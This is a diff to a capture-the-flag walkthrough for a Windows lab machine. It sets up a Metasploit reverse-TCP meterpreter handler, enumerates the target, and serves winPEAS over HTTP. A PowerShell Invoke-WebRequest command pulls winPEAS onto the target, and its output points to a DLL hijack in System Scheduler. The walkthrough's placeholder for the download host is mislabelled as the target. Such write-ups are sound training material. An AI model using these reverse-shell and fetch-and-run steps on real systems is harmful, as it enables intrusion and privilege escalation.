@@ -232,11 +232,11 @@ In a new terminal, set up a Metasploit multi-handler:
 
 ```text
 # msfconsole -q
-msf5 > use exploit/multi/handler
-msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
-msf5 exploit(multi/handler) > set LHOST <IP address attack machine>
-msf5 exploit(multi/handler) > set LPORT 5555
-msf5 exploit(multi/handler) > run
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST <IP address attack machine>
+msf6 exploit(multi/handler) > set LPORT 5555
+msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on <IP address attack machine>:5555 
 ```
@@ -258,11 +258,23 @@ Get detailed information about the Windows system:
 
 ```text
 meterpreter > sysinfo
+```
+
+```text
 meterpreter > ps
+```
+
+```text
 meterpreter > cd "c:\program files (x86)"
 meterpreter > ls
+```
+
+```text
 meterpreter > cd SystemScheduler
 meterpreter > ls
+```
+
+```text
 meterpreter > cd events
 meterpreter > ls
 ```
@@ -315,17 +327,45 @@ meterpreter > cat root.txt
 
 Get WinPEAS:
 
-    # wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat
+    # wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe
 
 Start a http server:
 
     # python -m http.server 8888
 
-In the reverse shell, download WinPEAS:
-
-    powershell -c "Invoke-WebRequest -Uri 'http://<IP address target>:8888/WinPEAS.bat' -OutFile 'c:\windows\temp\winpeas.exe'"
-
-Drop into a normal cmd shell and execute WinPEAS:
+In the meterpreter shell, drop into a normal cmd shell, cd in to the Temp folder which is writeable by everyone, 
+then use PowerShell to pull winPEAS over:
 
     meterpreter > shell
-    c:\Windows\Temp> winpeas.exe
+    C:\Windows\Temp> powershell -c "Invoke-WebRequest -Uri 'http://<IP address target>:8888/WinPEAS.exe' -OutFile 'c:\windows\temp\winpeas.exe'"
+    C:\Windows\Temp> winpeas.exe
+
+A lot of output. The Services Information section:
+
+```text
+  ========================================(Services Information)========================================
+  [+] Interesting Services -non Microsoft-
+   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    Amazon EC2Launch(Amazon Web Services, Inc. - Amazon EC2Launch)["C:\Program Files\Amazon\EC2Launch\EC2Launch.exe" service] - Auto - Stopped
+    Amazon EC2Launch
+   =================================================================================================
+    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
+    Amazon SSM Agent
+   =================================================================================================
+    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
+    AWS Lite Guest Agent
+   =================================================================================================
+    Ec2Config(Amazon Web Services, Inc. - Ec2Config)["C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"] - Auto - Running - isDotNet
+    Ec2 Configuration Service
+   =================================================================================================
+    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
+   =================================================================================================
+    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
+    File Permissions: Everyone [WriteData/CreateFiles]
+    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
+    System Scheduler Service Wrapper
+   =================================================================================================
+```
+
+The last one indicates a possible DLL hijack. On Exploit-DB: 
+[Splinterware System Scheduler Pro 5.12 - Privilege Escalation](https://www.exploit-db.com/exploits/45072)
